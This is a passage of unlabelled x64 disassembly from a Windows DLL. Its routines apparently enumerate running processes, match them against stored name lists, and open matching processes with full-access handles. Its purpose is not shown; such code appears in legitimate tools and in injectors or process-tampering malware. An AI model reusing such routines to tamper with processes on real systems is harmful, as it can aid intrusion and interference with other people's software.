   1800016f0:	44 89 64 24 4c       	mov    %r12d,0x4c(%rsp)
   1800016f5:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   1800016fa:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1800016ff:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   180001704:	48 8b cb             	mov    %rbx,%rcx
   180001707:	ff 15 9b 4a 00 00    	call   *0x4a9b(%rip)        # 0x1800061a8
   18000170d:	85 c0                	test   %eax,%eax
   18000170f:	74 0e                	je     0x18000171f
   180001711:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   180001716:	48 85 d2             	test   %rdx,%rdx
   180001719:	0f 85 95 00 00 00    	jne    0x1800017b4
   18000171f:	ff c5                	inc    %ebp
   180001721:	8b 44 24 60          	mov    0x60(%rsp),%eax
   180001725:	c1 e8 02             	shr    $0x2,%eax
   180001728:	3b e8                	cmp    %eax,%ebp
   18000172a:	72 94                	jb     0x1800016c0
   18000172c:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000172f:	0f 11 06             	movups %xmm0,(%rsi)
   180001732:	4c 89 66 10          	mov    %r12,0x10(%rsi)
   180001736:	4c 89 66 18          	mov    %r12,0x18(%rsi)
   18000173a:	45 33 c0             	xor    %r8d,%r8d
   18000173d:	48 8d 15 8c 72 00 00 	lea    0x728c(%rip),%rdx        # 0x1800089d0
   180001744:	48 8b ce             	mov    %rsi,%rcx
   180001747:	e8 34 11 00 00       	call   0x180002880
   18000174c:	90                   	nop
   18000174d:	48 85 db             	test   %rbx,%rbx
   180001750:	74 33                	je     0x180001785
   180001752:	48 2b fb             	sub    %rbx,%rdi
   180001755:	48 81 ff 00 10 00 00 	cmp    $0x1000,%rdi
   18000175c:	72 1c                	jb     0x18000177a
   18000175e:	48 83 c7 27          	add    $0x27,%rdi
   180001762:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   180001766:	48 2b d8             	sub    %rax,%rbx
   180001769:	48 83 eb 08          	sub    $0x8,%rbx
   18000176d:	48 83 fb 1f          	cmp    $0x1f,%rbx
   180001771:	0f 87 95 00 00 00    	ja     0x18000180c
   180001777:	48 8b d8             	mov    %rax,%rbx
   18000177a:	48 8b d7             	mov    %rdi,%rdx
   18000177d:	48 8b cb             	mov    %rbx,%rcx
   180001780:	e8 9f 31 00 00       	call   0x180004924
   180001785:	48 8b c6             	mov    %rsi,%rax
   180001788:	48 8b 8c 24 e0 00 00 	mov    0xe0(%rsp),%rcx
   18000178f:	00 
   180001790:	48 33 cc             	xor    %rsp,%rcx
   180001793:	e8 f8 2c 00 00       	call   0x180004490
   180001798:	4c 8d 9c 24 f0 00 00 	lea    0xf0(%rsp),%r11
   18000179f:	00 
   1800017a0:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   1800017a4:	49 8b 6b 48          	mov    0x48(%r11),%rbp
   1800017a8:	49 8b e3             	mov    %r11,%rsp
   1800017ab:	41 5f                	pop    %r15
   1800017ad:	41 5e                	pop    %r14
   1800017af:	41 5c                	pop    %r12
   1800017b1:	5f                   	pop    %rdi
   1800017b2:	5e                   	pop    %rsi
   1800017b3:	c3                   	ret
   1800017b4:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800017b7:	0f 11 06             	movups %xmm0,(%rsi)
   1800017ba:	4c 89 66 10          	mov    %r12,0x10(%rsi)
   1800017be:	4c 89 66 18          	mov    %r12,0x18(%rsi)
   1800017c2:	44 8b 44 24 4c       	mov    0x4c(%rsp),%r8d
   1800017c7:	48 8b ce             	mov    %rsi,%rcx
   1800017ca:	e8 b1 10 00 00       	call   0x180002880
   1800017cf:	90                   	nop
   1800017d0:	48 85 db             	test   %rbx,%rbx
   1800017d3:	74 b0                	je     0x180001785
   1800017d5:	48 2b fb             	sub    %rbx,%rdi
   1800017d8:	48 81 ff 00 10 00 00 	cmp    $0x1000,%rdi
   1800017df:	72 99                	jb     0x18000177a
   1800017e1:	48 83 c7 27          	add    $0x27,%rdi
   1800017e5:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   1800017e9:	48 2b d8             	sub    %rax,%rbx
   1800017ec:	48 83 eb 08          	sub    $0x8,%rbx
   1800017f0:	48 83 fb 1f          	cmp    $0x1f,%rbx
   1800017f4:	76 81                	jbe    0x180001777
   1800017f6:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1800017fb:	45 33 c9             	xor    %r9d,%r9d
   1800017fe:	45 33 c0             	xor    %r8d,%r8d
   180001801:	33 d2                	xor    %edx,%edx
   180001803:	33 c9                	xor    %ecx,%ecx
   180001805:	ff 15 35 4a 00 00    	call   *0x4a35(%rip)        # 0x180006240
   18000180b:	cc                   	int3
   18000180c:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   180001811:	45 33 c9             	xor    %r9d,%r9d
   180001814:	45 33 c0             	xor    %r8d,%r8d
   180001817:	33 d2                	xor    %edx,%edx
   180001819:	33 c9                	xor    %ecx,%ecx
   18000181b:	ff 15 1f 4a 00 00    	call   *0x4a1f(%rip)        # 0x180006240
   180001821:	cc                   	int3
   180001822:	e8 f9 fa ff ff       	call   0x180001320
   180001827:	cc                   	int3
   180001828:	cc                   	int3
   180001829:	cc                   	int3
   18000182a:	cc                   	int3
   18000182b:	cc                   	int3
   18000182c:	cc                   	int3
   18000182d:	cc                   	int3
   18000182e:	cc                   	int3
   18000182f:	cc                   	int3
   180001830:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001835:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   18000183a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000183f:	57                   	push   %rdi
   180001840:	48 81 ec 80 01 00 00 	sub    $0x180,%rsp
   180001847:	48 8b 05 f2 97 00 00 	mov    0x97f2(%rip),%rax        # 0x18000b040
   18000184e:	48 33 c4             	xor    %rsp,%rax
   180001851:	48 89 84 24 70 01 00 	mov    %rax,0x170(%rsp)
   180001858:	00 
   180001859:	48 8b f9             	mov    %rcx,%rdi
   18000185c:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   180001861:	33 c9                	xor    %ecx,%ecx
   180001863:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   180001867:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000186a:	0f 11 07             	movups %xmm0,(%rdi)
   18000186d:	48 89 0f             	mov    %rcx,(%rdi)
   180001870:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
   180001874:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   180001878:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   18000187f:	00 
   180001880:	33 d2                	xor    %edx,%edx
   180001882:	b9 02 00 00 00       	mov    $0x2,%ecx
   180001887:	ff 15 8b 47 00 00    	call   *0x478b(%rip)        # 0x180006018
   18000188d:	48 8b e8             	mov    %rax,%rbp
   180001890:	c7 44 24 40 30 01 00 	movl   $0x130,0x40(%rsp)
   180001897:	00 
   180001898:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   18000189d:	48 8b c8             	mov    %rax,%rcx
   1800018a0:	ff 15 5a 47 00 00    	call   *0x475a(%rip)        # 0x180006000
   1800018a6:	85 c0                	test   %eax,%eax
   1800018a8:	0f 84 9a 00 00 00    	je     0x180001948
   1800018ae:	66 90                	xchg   %ax,%ax
   1800018b0:	48 8b 1d a1 9e 00 00 	mov    0x9ea1(%rip),%rbx        # 0x18000b758
   1800018b7:	48 8b 35 a2 9e 00 00 	mov    0x9ea2(%rip),%rsi        # 0x18000b760
   1800018be:	48 3b de             	cmp    %rsi,%rbx
   1800018c1:	74 6f                	je     0x180001932
   1800018c3:	48 8b d3             	mov    %rbx,%rdx
   1800018c6:	48 83 7b 18 0f       	cmpq   $0xf,0x18(%rbx)
   1800018cb:	76 03                	jbe    0x1800018d0
   1800018cd:	48 8b 13             	mov    (%rbx),%rdx
   1800018d0:	48 8d 4c 24 6c       	lea    0x6c(%rsp),%rcx
   1800018d5:	ff 15 b5 49 00 00    	call   *0x49b5(%rip)        # 0x180006290
   1800018db:	85 c0                	test   %eax,%eax
   1800018dd:	75 4a                	jne    0x180001929
   1800018df:	44 8b 44 24 48       	mov    0x48(%rsp),%r8d
   1800018e4:	33 d2                	xor    %edx,%edx
   1800018e6:	b9 ff ff 1f 00       	mov    $0x1fffff,%ecx
   1800018eb:	ff 15 1f 47 00 00    	call   *0x471f(%rip)        # 0x180006010
   1800018f1:	48 85 c0             	test   %rax,%rax
   1800018f4:	74 33                	je     0x180001929
   1800018f6:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800018fb:	8b 44 24 48          	mov    0x48(%rsp),%eax
   1800018ff:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180001903:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   180001907:	48 3b 57 10          	cmp    0x10(%rdi),%rdx
   18000190b:	74 0f                	je     0x18000191c
   18000190d:	0f 10 44 24 28       	movups 0x28(%rsp),%xmm0
   180001912:	0f 11 02             	movups %xmm0,(%rdx)
   180001915:	48 83 47 08 10       	addq   $0x10,0x8(%rdi)
   18000191a:	eb 0d                	jmp    0x180001929
   18000191c:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   180001921:	48 8b cf             	mov    %rdi,%rcx
   180001924:	e8 97 11 00 00       	call   0x180002ac0
   180001929:	48 83 c3 20          	add    $0x20,%rbx
   18000192d:	48 3b de             	cmp    %rsi,%rbx
   180001930:	75 91                	jne    0x1800018c3
   180001932:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180001937:	48 8b cd             	mov    %rbp,%rcx
   18000193a:	ff 15 f0 46 00 00    	call   *0x46f0(%rip)        # 0x180006030
   180001940:	85 c0                	test   %eax,%eax
   180001942:	0f 85 68 ff ff ff    	jne    0x1800018b0
   180001948:	48 8b cd             	mov    %rbp,%rcx
   18000194b:	ff 15 ef 46 00 00    	call   *0x46ef(%rip)        # 0x180006040
   180001951:	48 8b c7             	mov    %rdi,%rax
   180001954:	48 8b 8c 24 70 01 00 	mov    0x170(%rsp),%rcx
   18000195b:	00 
   18000195c:	48 33 cc             	xor    %rsp,%rcx
   18000195f:	e8 2c 2b 00 00       	call   0x180004490
   180001964:	4c 8d 9c 24 80 01 00 	lea    0x180(%rsp),%r11
   18000196b:	00 
   18000196c:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   180001970:	49 8b 6b 20          	mov    0x20(%r11),%rbp
   180001974:	49 8b 73 28          	mov    0x28(%r11),%rsi
   180001978:	49 8b e3             	mov    %r11,%rsp
   18000197b:	5f                   	pop    %rdi
   18000197c:	c3                   	ret
   18000197d:	cc                   	int3
   18000197e:	cc                   	int3
   18000197f:	cc                   	int3
   180001980:	48 8b c4             	mov    %rsp,%rax
   180001983:	48 89 58 10          	mov    %rbx,0x10(%rax)
   180001987:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000198b:	55                   	push   %rbp
   18000198c:	57                   	push   %rdi
   18000198d:	41 54                	push   %r12
   18000198f:	41 56                	push   %r14
   180001991:	41 57                	push   %r15
   180001993:	48 8d a8 d8 fb ff ff 	lea    -0x428(%rax),%rbp
   18000199a:	48 81 ec 00 05 00 00 	sub    $0x500,%rsp
   1800019a1:	0f 29 70 c8          	movaps %xmm6,-0x38(%rax)
   1800019a5:	48 8b 05 94 96 00 00 	mov    0x9694(%rip),%rax        # 0x18000b040
   1800019ac:	48 33 c4             	xor    %rsp,%rax
   1800019af:	48 89 85 e0 03 00 00 	mov    %rax,0x3e0(%rbp)
   1800019b6:	48 8b f1             	mov    %rcx,%rsi
   1800019b9:	48 89 4c 24 68       	mov    %rcx,0x68(%rsp)
   1800019be:	45 33 e4             	xor    %r12d,%r12d
   1800019c1:	44 89 64 24 30       	mov    %r12d,0x30(%rsp)
   1800019c6:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800019c9:	0f 11 01             	movups %xmm0,(%rcx)
   1800019cc:	4c 89 21             	mov    %r12,(%rcx)
   1800019cf:	4c 89 61 08          	mov    %r12,0x8(%rcx)
   1800019d3:	4c 89 61 10          	mov    %r12,0x10(%rcx)
   1800019d7:	c7 44 24 30 01 00 00 	movl   $0x1,0x30(%rsp)
   1800019de:	00 
   1800019df:	33 d2                	xor    %edx,%edx
   1800019e1:	b9 02 00 00 00       	mov    $0x2,%ecx
   1800019e6:	ff 15 2c 46 00 00    	call   *0x462c(%rip)        # 0x180006018
   1800019ec:	4c 8b f8             	mov    %rax,%r15
   1800019ef:	c7 44 24 70 38 02 00 	movl   $0x238,0x70(%rsp)
   1800019f6:	00 
   1800019f7:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1800019fc:	48 8b c8             	mov    %rax,%rcx
   1800019ff:	ff 15 33 46 00 00    	call   *0x4633(%rip)        # 0x180006038
   180001a05:	85 c0                	test   %eax,%eax
   180001a07:	0f 84 f7 01 00 00    	je     0x180001c04
   180001a0d:	66 0f 6f 35 3b 74 00 	movdqa 0x743b(%rip),%xmm6        # 0x180008e50
   180001a14:	00 
   180001a15:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   180001a1c:	00 00 00 00 
   180001a20:	44 8b 44 24 78       	mov    0x78(%rsp),%r8d
   180001a25:	33 d2                	xor    %edx,%edx
   180001a27:	b9 10 04 00 00       	mov    $0x410,%ecx
   180001a2c:	ff 15 de 45 00 00    	call   *0x45de(%rip)        # 0x180006010
   180001a32:	4c 8b f0             	mov    %rax,%r14
   180001a35:	48 85 c0             	test   %rax,%rax
   180001a38:	0f 84 b0 01 00 00    	je     0x180001bee
   180001a3e:	41 b9 04 01 00 00    	mov    $0x104,%r9d
   180001a44:	4c 8d 85 d0 01 00 00 	lea    0x1d0(%rbp),%r8
   180001a4b:	33 d2                	xor    %edx,%edx
   180001a4d:	48 8b c8             	mov    %rax,%rcx
   180001a50:	ff 15 b2 45 00 00    	call   *0x45b2(%rip)        # 0x180006008
   180001a56:	85 c0                	test   %eax,%eax
   180001a58:	0f 84 87 01 00 00    	je     0x180001be5
   180001a5e:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001a61:	0f 11 44 24 48       	movups %xmm0,0x48(%rsp)
   180001a66:	0f 57 c9             	xorps  %xmm1,%xmm1
   180001a69:	f3 0f 7f 4c 24 58    	movdqu %xmm1,0x58(%rsp)
   180001a6f:	48 8d 85 d0 01 00 00 	lea    0x1d0(%rbp),%rax
   180001a76:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   180001a7d:	0f 1f 00             	nopl   (%rax)
   180001a80:	49 ff c0             	inc    %r8
   180001a83:	66 42 83 3c 40 00    	cmpw   $0x0,(%rax,%r8,2)
   180001a89:	75 f5                	jne    0x180001a80
   180001a8b:	48 8d 95 d0 01 00 00 	lea    0x1d0(%rbp),%rdx
   180001a92:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   180001a97:	e8 e4 0d 00 00       	call   0x180002880
   180001a9c:	90                   	nop
   180001a9d:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   180001aa2:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   180001aa9:	e8 d2 fa ff ff       	call   0x180001580
   180001aae:	90                   	nop
   180001aaf:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   180001ab4:	48 83 fa 07          	cmp    $0x7,%rdx
   180001ab8:	76 37                	jbe    0x180001af1
   180001aba:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   180001ac1:	00 
   180001ac2:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   180001ac7:	48 8b c1             	mov    %rcx,%rax
   180001aca:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180001ad1:	72 19                	jb     0x180001aec
   180001ad3:	48 83 c2 27          	add    $0x27,%rdx
   180001ad7:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180001adb:	48 2b c1             	sub    %rcx,%rax
   180001ade:	48 83 e8 08          	sub    $0x8,%rax
   180001ae2:	48 83 f8 1f          	cmp    $0x1f,%rax
   180001ae6:	0f 87 54 01 00 00    	ja     0x180001c40
   180001aec:	e8 33 2e 00 00       	call   0x180004924
   180001af1:	f3 0f 7f 74 24 58    	movdqu %xmm6,0x58(%rsp)
   180001af7:	66 44 89 64 24 48    	mov    %r12w,0x48(%rsp)
   180001afd:	48 8b 1d 3c 9c 00 00 	mov    0x9c3c(%rip),%rbx        # 0x18000b740
   180001b04:	48 8b 3d 3d 9c 00 00 	mov    0x9c3d(%rip),%rdi        # 0x18000b748
   180001b0b:	48 3b df             	cmp    %rdi,%rbx
   180001b0e:	0f 84 8d 00 00 00    	je     0x180001ba1
   180001b14:	48 8b d3             	mov    %rbx,%rdx
   180001b17:	48 83 7b 18 07       	cmpq   $0x7,0x18(%rbx)
   180001b1c:	76 03                	jbe    0x180001b21
   180001b1e:	48 8b 13             	mov    (%rbx),%rdx
   180001b21:	48 8d 8d b0 01 00 00 	lea    0x1b0(%rbp),%rcx
   180001b28:	48 83 bd c8 01 00 00 	cmpq   $0x7,0x1c8(%rbp)
   180001b2f:	07 
   180001b30:	48 0f 47 8d b0 01 00 	cmova  0x1b0(%rbp),%rcx
   180001b37:	00 
   180001b38:	ff 15 5a 47 00 00    	call   *0x475a(%rip)        # 0x180006298
   180001b3e:	85 c0                	test   %eax,%eax
   180001b40:	74 0b                	je     0x180001b4d
   180001b42:	48 83 c3 20          	add    $0x20,%rbx
   180001b46:	48 3b df             	cmp    %rdi,%rbx
   180001b49:	75 c9                	jne    0x180001b14
   180001b4b:	eb 54                	jmp    0x180001ba1
   180001b4d:	49 8b ce             	mov    %r14,%rcx
   180001b50:	ff 15 ea 44 00 00    	call   *0x44ea(%rip)        # 0x180006040
   180001b56:	44 8b 44 24 78       	mov    0x78(%rsp),%r8d
   180001b5b:	33 d2                	xor    %edx,%edx
   180001b5d:	b9 ff ff 1f 00       	mov    $0x1fffff,%ecx
   180001b62:	ff 15 a8 44 00 00    	call   *0x44a8(%rip)        # 0x180006010
   180001b68:	48 85 c0             	test   %rax,%rax
   180001b6b:	74 34                	je     0x180001ba1
   180001b6d:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180001b72:	8b 44 24 78          	mov    0x78(%rsp),%eax
   180001b76:	89 44 24 40          	mov    %eax,0x40(%rsp)
   180001b7a:	48 8b 56 08          	mov    0x8(%rsi),%rdx
   180001b7e:	48 3b 56 10          	cmp    0x10(%rsi),%rdx
   180001b82:	74 0f                	je     0x180001b93
   180001b84:	0f 10 44 24 38       	movups 0x38(%rsp),%xmm0
   180001b89:	0f 11 02             	movups %xmm0,(%rdx)
   180001b8c:	48 83 46 08 10       	addq   $0x10,0x8(%rsi)
   180001b91:	eb 0e                	jmp    0x180001ba1
   180001b93:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   180001b98:	48 8b ce             	mov    %rsi,%rcx
   180001b9b:	e8 20 0f 00 00       	call   0x180002ac0
   180001ba0:	90                   	nop
   180001ba1:	48 8b 95 c8 01 00 00 	mov    0x1c8(%rbp),%rdx
   180001ba8:	48 83 fa 07          	cmp    $0x7,%rdx
   180001bac:	76 40                	jbe    0x180001bee
   180001bae:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   180001bb5:	00 
   180001bb6:	48 8b 8d b0 01 00 00 	mov    0x1b0(%rbp),%rcx
   180001bbd:	48 8b c1             	mov    %rcx,%rax
   180001bc0:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180001bc7:	72 15                	jb     0x180001bde
   180001bc9:	48 83 c2 27          	add    $0x27,%rdx
   180001bcd:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180001bd1:	48 2b c1             	sub    %rcx,%rax
   180001bd4:	48 83 e8 08          	sub    $0x8,%rax
   180001bd8:	48 83 f8 1f          	cmp    $0x1f,%rax
   180001bdc:	77 78                	ja     0x180001c56
   180001bde:	e8 41 2d 00 00       	call   0x180004924
   180001be3:	eb 09                	jmp    0x180001bee
   180001be5:	49 8b ce             	mov    %r14,%rcx
   180001be8:	ff 15 52 44 00 00    	call   *0x4452(%rip)        # 0x180006040
   180001bee:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   180001bf3:	49 8b cf             	mov    %r15,%rcx
   180001bf6:	ff 15 2c 44 00 00    	call   *0x442c(%rip)        # 0x180006028
   180001bfc:	85 c0                	test   %eax,%eax
   180001bfe:	0f 85 1c fe ff ff    	jne    0x180001a20
   180001c04:	49 8b cf             	mov    %r15,%rcx
   180001c07:	ff 15 33 44 00 00    	call   *0x4433(%rip)        # 0x180006040
   180001c0d:	48 8b c6             	mov    %rsi,%rax
   180001c10:	48 8b 8d e0 03 00 00 	mov    0x3e0(%rbp),%rcx
   180001c17:	48 33 cc             	xor    %rsp,%rcx
   180001c1a:	e8 71 28 00 00       	call   0x180004490
   180001c1f:	4c 8d 9c 24 00 05 00 	lea    0x500(%rsp),%r11
   180001c26:	00 
   180001c27:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   180001c2b:	49 8b 73 40          	mov    0x40(%r11),%rsi
   180001c2f:	41 0f 28 73 f0       	movaps -0x10(%r11),%xmm6
   180001c34:	49 8b e3             	mov    %r11,%rsp
   180001c37:	41 5f                	pop    %r15
   180001c39:	41 5e                	pop    %r14
   180001c3b:	41 5c                	pop    %r12
   180001c3d:	5f                   	pop    %rdi
   180001c3e:	5d                   	pop    %rbp
   180001c3f:	c3                   	ret
   180001c40:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   180001c45:	45 33 c9             	xor    %r9d,%r9d
   180001c48:	45 33 c0             	xor    %r8d,%r8d
   180001c4b:	33 d2                	xor    %edx,%edx
   180001c4d:	33 c9                	xor    %ecx,%ecx
   180001c4f:	ff 15 eb 45 00 00    	call   *0x45eb(%rip)        # 0x180006240
   180001c55:	90                   	nop
   180001c56:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   180001c5b:	45 33 c9             	xor    %r9d,%r9d
   180001c5e:	45 33 c0             	xor    %r8d,%r8d
   180001c61:	33 d2                	xor    %edx,%edx
   180001c63:	33 c9                	xor    %ecx,%ecx
   180001c65:	ff 15 d5 45 00 00    	call   *0x45d5(%rip)        # 0x180006240
   180001c6b:	cc                   	int3
   180001c6c:	cc                   	int3
   180001c6d:	cc                   	int3
   180001c6e:	cc                   	int3
   180001c6f:	cc                   	int3
   180001c70:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001c75:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180001c7a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180001c7f:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   180001c84:	55                   	push   %rbp
   180001c85:	41 56                	push   %r14
   180001c87:	41 57                	push   %r15
   180001c89:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   180001c8e:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   180001c95:	48 8b 05 a4 93 00 00 	mov    0x93a4(%rip),%rax        # 0x18000b040
   180001c9c:	48 33 c4             	xor    %rsp,%rax
   180001c9f:	48 89 45 37          	mov    %rax,0x37(%rbp)
   180001ca3:	45 33 ff             	xor    %r15d,%r15d
   180001ca6:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001ca9:	33 c0                	xor    %eax,%eax
   180001cab:	0f 11 45 1f          	movups %xmm0,0x1f(%rbp)
   180001caf:	48 89 45 2f          	mov    %rax,0x2f(%rbp)
   180001cb3:	0f 11 45 a7          	movups %xmm0,-0x59(%rbp)
   180001cb7:	0f 57 c9             	xorps  %xmm1,%xmm1
   180001cba:	f3 0f 7f 4d b7       	movdqu %xmm1,-0x49(%rbp)
   180001cbf:	b9 30 00 00 00       	mov    $0x30,%ecx
   180001cc4:	e8 e7 27 00 00       	call   0x1800044b0
   180001cc9:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   180001ccd:	66 0f 6f 05 ab 71 00 	movdqa 0x71ab(%rip),%xmm0        # 0x180008e80
   180001cd4:	00 
   180001cd5:	f3 0f 7f 45 b7       	movdqu %xmm0,-0x49(%rbp)
   180001cda:	0f 10 05 87 6d 00 00 	movups 0x6d87(%rip),%xmm0        # 0x180008a68
   180001ce1:	0f 11 00             	movups %xmm0,(%rax)
   180001ce4:	0f 10 0d 8d 6d 00 00 	movups 0x6d8d(%rip),%xmm1        # 0x180008a78
   180001ceb:	0f 11 48 10          	movups %xmm1,0x10(%rax)
   180001cef:	0f b7 0d 92 6d 00 00 	movzwl 0x6d92(%rip),%ecx        # 0x180008a88
   180001cf6:	66 89 48 20          	mov    %cx,0x20(%rax)
   180001cfa:	44 88 78 22          	mov    %r15b,0x22(%rax)
   180001cfe:	48 8d 55 a7          	lea    -0x59(%rbp),%rdx
   180001d02:	48 8d 4d 1f          	lea    0x1f(%rbp),%rcx
   180001d06:	e8 d5 f6 ff ff       	call   0x1800013e0
   180001d0b:	90                   	nop
   180001d0c:	48 8b 55 bf          	mov    -0x41(%rbp),%rdx
   180001d10:	48 83 fa 0f          	cmp    $0xf,%rdx
   180001d14:	76 43                	jbe    0x180001d59
   180001d16:	48 ff c2             	inc    %rdx
   180001d19:	48 8b 4d a7          	mov    -0x59(%rbp),%rcx
   180001d1d:	48 8b c1             	mov    %rcx,%rax
   180001d20:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180001d27:	72 2b                	jb     0x180001d54
   180001d29:	48 83 c2 27          	add    $0x27,%rdx
   180001d2d:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180001d31:	48 2b c1             	sub    %rcx,%rax
   180001d34:	48 83 e8 08          	sub    $0x8,%rax
   180001d38:	48 83 f8 1f          	cmp    $0x1f,%rax
   180001d3c:	76 16                	jbe    0x180001d54
   180001d3e:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   180001d43:	45 33 c9             	xor    %r9d,%r9d
   180001d46:	45 33 c0             	xor    %r8d,%r8d
   180001d49:	33 d2                	xor    %edx,%edx
   180001d4b:	33 c9                	xor    %ecx,%ecx
   180001d4d:	ff 15 ed 44 00 00    	call   *0x44ed(%rip)        # 0x180006240
   180001d53:	cc                   	int3
   180001d54:	e8 cb 2b 00 00       	call   0x180004924
   180001d59:	66 0f 6f 05 ff 70 00 	movdqa 0x70ff(%rip),%xmm0        # 0x180008e60
   180001d60:	00 
   180001d61:	f3 0f 7f 45 b7       	movdqu %xmm0,-0x49(%rbp)
   180001d66:	c6 45 a7 00          	movb   $0x0,-0x59(%rbp)
   180001d6a:	48 8b 4d 1f          	mov    0x1f(%rbp),%rcx
   180001d6e:	48 3b 4d 27          	cmp    0x27(%rbp),%rcx
   180001d72:	75 75                	jne    0x180001de9
   180001d74:	48 85 c9             	test   %rcx,%rcx
   180001d77:	74 43                	je     0x180001dbc
   180001d79:	48 8b 55 2f          	mov    0x2f(%rbp),%rdx
   180001d7d:	48 2b d1             	sub    %rcx,%rdx
   180001d80:	48 8b c1             	mov    %rcx,%rax
   180001d83:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180001d8a:	72 2b                	jb     0x180001db7
   180001d8c:	48 83 c2 27          	add    $0x27,%rdx
   180001d90:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180001d94:	48 2b c1             	sub    %rcx,%rax
   180001d97:	48 83 e8 08          	sub    $0x8,%rax
   180001d9b:	48 83 f8 1f          	cmp    $0x1f,%rax
   180001d9f:	76 16                	jbe    0x180001db7
   180001da1:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   180001da6:	45 33 c9             	xor    %r9d,%r9d
   180001da9:	45 33 c0             	xor    %r8d,%r8d
   180001dac:	33 d2                	xor    %edx,%edx
   180001dae:	33 c9                	xor    %ecx,%ecx
   180001db0:	ff 15 8a 44 00 00    	call   *0x448a(%rip)        # 0x180006240
   180001db6:	cc                   	int3
   180001db7:	e8 68 2b 00 00       	call   0x180004924
   180001dbc:	48 8b 4d 37          	mov    0x37(%rbp),%rcx
   180001dc0:	48 33 cc             	xor    %rsp,%rcx
   180001dc3:	e8 c8 26 00 00       	call   0x180004490
   180001dc8:	4c 8d 9c 24 f0 00 00 	lea    0xf0(%rsp),%r11
   180001dcf:	00 
   180001dd0:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   180001dd4:	49 8b 73 28          	mov    0x28(%r11),%rsi
   180001dd8:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   180001ddc:	4d 8b 63 38          	mov    0x38(%r11),%r12
   180001de0:	49 8b e3             	mov    %r11,%rsp
   180001de3:	41 5f                	pop    %r15
   180001de5:	41 5e                	pop    %r14
   180001de7:	5d                   	pop    %rbp
   180001de8:	c3                   	ret
   180001de9:	49 bc ff ff ff ff ff 	movabs $0xfffffffffffffff,%r12
   180001df0:	ff ff 0f 
   180001df3:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001df6:	33 c0                	xor    %eax,%eax
   180001df8:	0f 11 45 ef          	movups %xmm0,-0x11(%rbp)
   180001dfc:	48 89 45 ff          	mov    %rax,-0x1(%rbp)
   180001e00:	48 8d 4d ef          	lea    -0x11(%rbp),%rcx
   180001e04:	e8 27 fa ff ff       	call   0x180001830
   180001e09:	90                   	nop
   180001e0a:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001e0d:	33 c0                	xor    %eax,%eax
   180001e0f:	0f 11 45 07          	movups %xmm0,0x7(%rbp)
   180001e13:	48 89 45 17          	mov    %rax,0x17(%rbp)
   180001e17:	48 8d 4d 07          	lea    0x7(%rbp),%rcx
   180001e1b:	e8 60 fb ff ff       	call   0x180001980
   180001e20:	90                   	nop
